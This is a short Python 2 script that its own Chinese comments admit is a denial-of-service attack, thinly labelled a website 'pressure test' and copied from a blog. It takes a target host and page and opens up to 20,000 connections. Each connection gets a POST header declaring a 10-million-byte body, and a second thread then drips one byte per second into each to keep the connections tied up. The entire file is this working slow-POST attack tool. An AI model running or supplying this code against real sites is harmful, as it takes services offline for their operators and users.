#!/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'weijie'
'''
其实是Dos攻击
描述:给大家贴上一段网上看到的测试网站压力的代码，希望对您的工作和学习有帮助，但是不希望大家拿着它去攻击别人
来源网址：http://www.cnblogs.com/sunokv/archive/2012/12/17/2821701.html
'''
import socket
import time
import threading
#Pressure Test,ddos tool这个注释写得很冠冕堂皇啊。呵呵…
#---------------------------
MAX_CONN = 20000
PORT = 80
HOST = raw_input('请输入一个网址：') #www.baidu.com
PAGE = raw_input('请输入一个页面（如/index.php）：')
if len(PAGE) == 0:
    PAGE = 'index.php'
#end if
#---------------------------

buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 10000000\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))

socks = []


def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf)
            print "Send buf OK!,conn=%d\n" % i
            socks.append(s)
        except Exception, ex:
            print "Could not connect to server or send error:%s" % ex
            time.sleep(10)

#end def

def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f")
            #print "send OK!"
            except Exception, ex:
                print "Send Exception:%s\n" % ex
                socks.remove(s)
                s.close()
        time.sleep(1)

#end def
if __name__ == '__main__':
    conn_th = threading.Thread(target=conn_thread, args=())
    send_th = threading.Thread(target=send_thread, args=())

    conn_th.start()
    send_th.start()

